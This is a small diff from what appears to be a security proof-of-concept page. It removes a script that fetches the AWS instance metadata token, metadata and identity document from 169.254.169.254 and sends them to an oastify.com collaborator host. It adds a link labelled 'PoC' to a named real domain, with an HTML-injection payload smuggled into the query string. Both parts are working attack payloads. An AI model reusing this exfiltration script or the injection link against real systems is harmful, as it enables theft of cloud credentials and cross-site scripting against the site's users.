@@ -1,31 +1,3 @@
 
-<script>
-var logTimeServer = 'dhyu6n5xn0gneggl95shaggsmjslgb40.oastify.com';
-
-
-function log(data) {
-    var sreq = new XMLHttpRequest();
-    sreq.open('GET', 'http://' + logTimeServer + '/?msg=' + encodeURI(data), true);
-    sreq.send();
-}
-
-function get(url) {
-    try {
-        var req = new XMLHttpRequest();
-        req.open('GET', url, false);
-        req.send(null);
-        if(req.status == 200)
-            return req.responseText;
-        else
-            return '[failed status=' + req.status + ']';
-    } catch(err) {
-        log(err);
-    }
-    return null;
-}
-
-log('Triggered in ' + window.location.href);
-log('Token: ' + get('http://169.254.169.254/latest/api/token'));
-log('Meta Data: ' + get('http://169.254.169.254/latest/meta-data'));
-log('Document: ' + get('http://169.254.169.254/latest/dynamic/instance-identity/document'));
-</script>
+        <!-- Link back to site from your domain -->
+        <a href="https://m-qa-sams.walmartmobile.cn/common/wx-page-error?text=asd%22/%3E%3Cimg%20src=1%3E}}}">PoC</a>
